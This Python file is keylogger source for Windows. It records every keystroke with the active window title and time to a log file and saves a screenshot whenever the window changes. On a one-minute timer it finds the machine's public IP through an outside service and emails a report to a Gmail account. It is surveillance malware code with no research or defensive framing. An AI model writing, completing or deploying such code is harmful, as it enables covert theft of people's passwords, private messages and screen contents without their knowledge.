import keyboard
import ctypes
import win32gui
import datetime
import pyscreenshot
import os
import threading
import sys
import smtplib
from dotenv import load_dotenv
from email.mime.text import MIMEText
from urllib.request import urlopen
import re

load_dotenv()

REPORT_INTERVAL = 60
EMAIL = os.getenv("EMAIL")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")

curr_window = ""
total_screenshots = 0

def key_callback(event : keyboard.KeyboardEvent):
    global curr_window, total_screenshots

    log_line = ""
    screenshot_line = ""
    
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    new_window = win32gui.GetWindowText(user32.GetForegroundWindow())

    if new_window != curr_window:
        curr_window = new_window
        image = pyscreenshot.grab()
        total_screenshots = len(os.listdir("screenshots"))
        image.save(f"screenshots/image_{total_screenshots}.png")
        screenshot_line = f" | Screenshot taken: image_{total_screenshots}.png"

    log_line += f"Key: {event.name} | "
    log_line += f"{curr_window} | "

    dt = datetime.datetime.fromtimestamp(event.time)
    log_line += f"{dt}"
    log_line += screenshot_line

    with open("log.txt", "a") as f:
        f.write(log_line + "\n")

    print(log_line)

def send_report():
    print("Sending report")
    try:
        data = str(urlopen('http://checkip.dyndns.com/').read())
        ip = re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
        msg = MIMEText("")
        msg['Subject'] = f"Report From {ip}"
        msg['From'] = EMAIL
        msg['To'] = EMAIL
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(EMAIL, EMAIL_PASSWORD)
            smtp_server.sendmail(EMAIL, EMAIL, msg.as_string())
    except Exception as e:
        print("Failed to send report")

    timer = threading.Timer(REPORT_INTERVAL, send_report)
    timer.daemon = True
    timer.start()

def main():
    send_report()
    keyboard.on_release(key_callback)
    keyboard.wait()

if __name__ == "__main__":
    main()